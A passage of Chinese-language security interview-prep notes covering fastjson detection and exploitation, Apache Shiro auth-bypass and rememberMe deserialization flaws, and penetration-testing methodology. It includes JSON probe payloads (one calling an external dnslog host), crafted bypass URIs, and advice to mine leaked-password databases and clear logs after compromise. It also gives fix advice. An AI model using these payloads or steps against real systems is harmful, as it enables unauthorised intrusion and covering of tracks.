java系处理json一般采用fastjson或jackson，jackson要求json与javabeacon严格对齐，假定需求的json如下

```
{"name":"json", "age":21}
```

增加一个键值对

```
{"name":"json", "age":21,"test":123}
```

如果返回输入错误则应该使用的是jackson，反之则为fastjson

（3）判断是否存在低版本fastjson

当fastjson版本低于1.6.0的时候可以尝试通过dos的方式判断是否存在fastjson 但不能成不代表一定没有fastjson。

```
{"a":"\x
```

（4）通过dnslog进行盲打

1.2.67版本前

```
{"zeo":{"@type":"java.net.Inet4Address","val":"w1nk2u.dnslog.cn"}}
```

1.2.67版本后

```
{"@type":"java.net.Inet4Address","val":"dnslog"} {"@type":"java.net.Inet6Address","val":"dnslog"}
```

畸形dnslog

```
{"@type":"java.net.InetSocketAddress"{"address":,"val":"dnslog"}}
```

### 2-4.fastjson漏洞利用

攻击者构造恶意的json数据提交给服务器，服务器向rmi服务器请求并解析恶意指令，从而拿到目标服务器的权限。

Fastjson反序列化漏洞利用示意图：

![img](https://image.201068.xyz/assets/0.3.第二阶段面试题/clip_image004-1733806107703-11.jpg)

### 2-5.修复建议

1. 更新fastjson版本：fastjson的开发团队经常发布更新版本以修复漏洞，建议使用最新版本。
2. 禁用autotype：fastjson的autotype功能可能会导致一些安全问题，可以通过禁用autotype来修复漏洞。
3. 过滤输入参数：在使用fastjson解析json数据时，应该对输入参数进行过滤，确保输入数据符合预期。
4. 使用安全配置：fastjson提供了一些安全配置选项，可以通过设置这些选项来增强安全性。
5. 防火墙规则：可以通过防火墙规则来限制fastjson的请求，只允许特定的IP或者端口访问。

## 3.了解过shiro框架吗，知道shiro越权漏洞吗

### 3-1.Apache Shiro框架介绍

Apache Shiro是一个强大且易用的Java安全框架，执行身份验证.授权.密码和会话管理。目前常见集成于各种应用中进行身份验证，授权等。

### 3-2.shiro权限绕过的原因（重点）

Apache Shiro是一个Java的安全管理框架，可以和spring一起使用。 shiro框架通过拦截器来实现对用户访问权限的控制和拦截。

Shiro常见的拦截器有anon,authc等。

1.anon：匿名拦截器，不需登录就能访问，一般用于静态资源，或者移动端接口。

2.authc：登录拦截器，需要登录认证才能访问的资源。

在特定的版本中，将Apache Shiro与Spring控制器一起使用时，特制请求可能会导致身份验证绕过。，从而导致了权限绕过。

### 3-3.shiro权限绕过的限制条件（重点）

网站同时使用shiro和spring.shiro满足特定的版本。

### 3-4.漏洞利用

CVE-2016-6802

shiro版本：shiro < 1.5.0

shiro与spring的URI中末尾的 / 不同导致的权限绕过。

其中 * 表示匹配零个或多个字符串， /* 可以匹配/admin，但匹配不到/admin/因为*通配符无法匹配路径。假设/admin接口设置了authc拦截器，访问/admin将会被进行权限判断，如果请求的URI为/admin/ 呢，/*的URL路径表达式将无法正确匹配，从而放行。然后进入到spring(Servlet)拦截器，而spring中 /admin形式和 /admin/形式的URL访问的资源是一样的，从而导致了绕过。

CVE-2020-1957

shiro版本：shiro < 1.5.2

通过网络判断，网站处理URI时会先经过 shiro 处理，再转发到 springboot 进行路由分发工作。而在 shiro中，在对URI中的 ; 进行处理时会将URI进行截断，然后对 /xxx/.. 进行权限校验，校验通过之后再由springboot进行路由分发，然后springboot会将URI /xxx/..;/admin/ 解释为/admin/,这样我们就可以成功访问到原本访问不到的接口了。

验证流程大致如下：

1.客户端发起请求 /xxx/..;/admin/ 。

2.shiro处理之后返回/xxx/..校验通过。

3.springboot处理 /xxx/..;/admin/ 返回 /admin/ 。 

4.最后访问到需要权限校验的资源。

### 3-5.漏洞修复

更新最新版本

## 4.了解过shiro框架吗，知道shiro反序列化漏洞吗

### 4-1 什么是shiro

  Apache Shiro是一个强大且易用的Java安全框架,执行身份验证.授权.密码和会话管理。使用Shiro的易于理解的API,您可以快速.轻松地获得任何应用程序,从最小的移动应用程序到最大的网络和企业应用程序

 

### 4-2 什么是序列化 

  序列化就是为了传输遍历，把一个对象类型的数据转换成字符串进行传输；或者在PHP语言里面把一个类或者对象，或者函数等通过serialize函数进行序列化便于传输；序列化后产生的JSON，或者XML格式不仅传输便利，而且可以跨语言传输数据，这个把某个对象序列化成json格式或者XML格式或者其他序列化格式的字符串过程称为序列化。

 

### 4-3 什么是反序列化

  反序列化就是序列化的逆向过程，把一个序列化的JSON字符串内容或者XML内容反向还原回序列化前的对象格式

 

### 4-4 漏洞原理

  Apache Shiro 1.2.4及以前版本中，加密的用户信息序列化后存储在名为remember-me的Cookie中。攻击者可以使用Shiro的默认密钥伪造用户Cookie，触发Java反序列化漏洞，进而在目标机器上执行任意命令。

 

  在Apache shiro的框架中，执行身份验证时提供了一个记住密码的功能（RememberMe），如果用户登录时勾选了这个选项。用户的请求数据包中将会在cookie字段多出一段数据，这一段数据包含了用户的身份信息，且是经过加密的。加密的过程是：用户信息=>序列化=>AES加密（这一步需要用密钥key）=>base64编码=>添加到RememberMe Cookie字段。勾选记住密码之后，下次登录时，服务端会根据客户端请求包中的cookie值进行身份验证，无需登录即可访问。那么显然，服务端进行对cookie进行验证的步骤就是：取出请求包中rememberMe的cookie值 => Base64解码=>AES解密（用到密钥key）=>反序列化。

 

  客户端产生rememberMe键值对以及服务端进行cookie验证步骤

 

![IMG_256](https://image.201068.xyz/assets/0.3.第二阶段面试题/clip_image006-1733806107703-12.jpg)

 

在服务端AES解密以后进行反序列化才得到用户信息

 

### 4-5 漏洞利用思路 

  既然能进行序列化，那我们可以对我们自己的攻击代码进行相同的AES加密，base64编码以后产生rememberMe字段发给服务端，服务端反向进行解密得到我们攻击代码并会运行，进而我们就攻击成功了

# 5.渗透思路

## 1.给一个IP你的渗透思路（重点）

### a.信息收集

1.首先拿到IP地址，进行IP地址端口扫描，对响应的端口进行漏洞探测，比如 rsync,心脏出血，mysql,ftp,ssh弱口令等。

2.IP反查域名.站长之家.fofa等查询IP对应的域名信息

3.通过域名信息查找域名所属的公司信息，通过企查查和爱企查，查找到公司信息，收集该公司人员邮箱电话信息，微信公众号，qq群，谷歌语法找相关pdf，xlsx查看工号，姓名，公开笔记（语雀等），利用该公司的信息生成专用的密码字典，方便后续的后台登录尝试和越权漏洞尝试

4.查询服务器的旁站和子域名站点，一般主站的防护性比较完善，所有看看旁站和子域名下是否有通用性的cms或者其他信息泄露等漏洞

5.查看服务器操作系统版本，web中间件，看看是否存在已知的漏洞，比如IIS，APACHE,NGINX的解析漏洞 

6.查看服务器的提供商，各类的云，各类的waf，vpn的设备是什么，现在的供应链是新的一个渗透方向

(供应链是什么？

供应链攻击也称为第三方攻击或后门漏洞，当黑客通过向该组织提供软件服务的第三方合作伙伴或供应商渗透企业系统时，就会发生供应链攻击。它被称为供应链攻击，因为攻击发生的漏洞点是软件供应链，比如说是

a.  奇安信vpn存在未授权管理用户遍历及任意账号密码修改

b.  log4j2核弹级别漏洞，针对的是开源日志组件Apache的漏洞等

c.  阿里云如果存在漏洞，假如该站点是通过阿里云搭建的，通过阿里云漏洞就可以拿下整个网站)

7.扫描网站目录结构，看看是否可以遍历目录，或者敏感文件泄漏，比如php探针 .google hack 进一步探测网站的信息，后台，敏感文件。

8.敏感信息收集，如 github 源码.用 7kb.破壳扫源代码泄露（.hg..git.cvs.svn..DS_store源代码泄露）.google hack.接口信息泄露.社工信息泄露.邮箱地址信息收集.网盘搜索.钟馗之眼.天眼查.威胁情报.微步在线等

### b.漏洞扫描

1.用 AWVS.APPSCAN.nessus等扫描器检测 Web 漏洞，如 XSS,XSRF,sql注入，代码执行，命令执行，越权访问，目录读取，任意文件读取，下载，文件包含， 远程命令执行，弱口令，上传，编辑器漏洞，暴力破解.反序列化等。

2.用主机漏扫工具Nessus.OpenVAS.NMAP等扫描主机漏洞，查看是否存在主机漏洞，例如永恒之蓝等。

### c.漏洞利用

利用以上的方式拿到 webshell，或者其他权限。

### d.权限提升

提权服务器，比如 windows 下 mysql 的 udf 提权，serv-u 提权，windows 低版本的漏洞。

如 iis6,pr,巴西烤肉，linux 脏牛漏洞，linux 内核版本漏洞提权，linux 下的 mysql system 提权以及 oracle 低权限提权。

### e.日志清理

操作系统.中间件.数据库等日志进行清除。

### f.总结报告及修复方案

整理渗透测试过程，发现漏洞过程.利用漏洞过程.漏洞是怎么产生的以及漏洞的修复方式。

## 2.给一个网页你的渗透思路（重点）

1.首页查看网页的指纹信息，框架，网页开发语言信息

2. 对所有页面进行目录扫描，查找后台站点，源码.后台目录结构.通过jsfinder扫描JS敏感信息

3. 通过JS敏感信息去拼接看是否能找到接口信息，拼接接口信息看是否能找到敏感信息.未授权漏洞，拼接接口借助fuzz进行模糊探测扫描

4.检查当前网站cookie，cookie集是name=-1，将其更改为1，刷新网页

5.使用burpsuite探测网站扫描参数，抓敏感参数相关的数据包，可以借助burp插件Hae

6.找到网站后台登录地址

- a.   万能密码尝试登录
- b.   弱口令漏洞检测
- c.    BP抓包检测是否存在注入漏洞
- d.   是否有不安全的信息提示，比如用户名存在，只提示密码错误，可以枚举用户名
- e.   查看页面源码是否存在敏感信息泄露，如测试账户和密码
- f.    不安全的验证码，验证码可以重复利用
- g.   抓包查看是否存在密码明文传输
- h.   登陆页面有下载app或者下载插件，可能存在任意文件下载漏洞
- 7.nmap 扫端口，查看端口服务开放状态。

## 3.给一个公司名称你的渗透思路（重点）

### a.信息收集

1.通过天眼查或者企查查上先查询相关公司域名及电话.邮箱等相关信息，收集该公司所有的域名信息，可以用小蓝本，备案信息查询收集域名，收集该公司的公众号.小程序.App信息，还有该公司100%控股的公司

2.获取到域名信息后，通过查询域名的whois信息，看是否能获取到注册者邮箱姓名电话等信息，放入社工库看是否存在密码泄露，可以通过泄露的密码进行后台登录，利用搜索到的关联信息找出其他邮箱进而得到常用社交账号。收集该公司人员邮箱电话信息，微信公众号，qq群，谷歌语法找相关pdf，xlsx查看工号，姓名，公开笔记（语雀等），或许会找出管理员设置密码的习惯，利用该信息生成专用的密码字典，方便后续的后台登录尝试和越权漏洞尝试

3.查询服务器的旁站和子域名站点，一般主站的防护性比较完善，所有看看旁站和子域名下是否有通用性的cms或者其他信息泄露等漏洞

4.查看服务器操作系统版本，web中间件，看看是否存在已知的漏洞，比如IIS，APACHE,NGINX的解析漏洞 

5.查看服务器的提供商，各类的云，各类的waf，vpn的设备是什么，现在的供应链是新的一个渗透方向

(供应链是什么？

供应链攻击也称为第三方攻击或后门漏洞，当黑客通过向该组织提供软件服务的第三方合作伙伴或供应商渗透企业系统时，就会发生供应链攻击。它被称为供应链攻击，因为攻击发生的漏洞点是软件供应链，比如说是

d.  奇安信vpn存在未授权管理用户遍历及任意账号密码修改

e.  log4j2核弹级别漏洞，针对的是开源日志组件Apache的漏洞等

f.  阿里云如果存在漏洞，假如该站点是通过阿里云搭建的，通过阿里云漏洞就可以拿下整个网站)

6.查询网站的真实IP地址，首先判断该网站是否存在cdn.waf，如果存在cdn，绕过cdn找到网站的真实IP地址，进行IP地址端口扫描，对响应的端口进行漏洞探测，比如 rsync,心脏出血，mysql,ftp,ssh弱口令等。

1) cdn回答就是cdn如何绕过方法
2) waf的话通过一个叫wafwOOf的python脚本识别，然后再针对绕过 

1.扫描网站目录结构，看看是否可以遍历目录，或者敏感文件泄漏，比如php探针 .google hack 进一步探测网站的信息，后台，敏感文件。

7.敏感信息收集，如 github 源码.用 7kb.破壳扫源代码泄露（.hg..git.cvs.svn..DS_store源代码泄露）.google hack.接口信息泄露.社工信息泄露.邮箱地址信息收集.网盘搜索.钟馗之眼.天眼查.威胁情报.微步在线等

### b.漏洞扫描

用 AWVS.APPSCAN.nessus等扫描器检测 Web 漏洞，如 XSS,XSRF,sql注入，代码执行，命令执行，越权访问，目录读取，任意文件读取，下载，文件包含， 远程命令执行，弱口令，上传，编辑器漏洞，暴力破解等

### c.漏洞利用

利用以上的方式拿到 webshell，或者其他权限

### d.权限提升

提权服务器，比如 windows 下 mysql 的 udf 提权，serv-u 提权，windows 低版本的漏洞，

如 iis6,pr,巴西烤肉，linux 脏牛漏洞，linux 内核版本漏洞提权，linux 下的 mysql system 提权以及 oracle 低权限提权

### e.日志清理

操作系统.中间件.数据库等日志进行清除

### f.总结报告及修复方案

整理渗透测试过程，发现漏洞过程.利用漏洞过程.漏洞是怎么产生的以及漏洞的修复方式。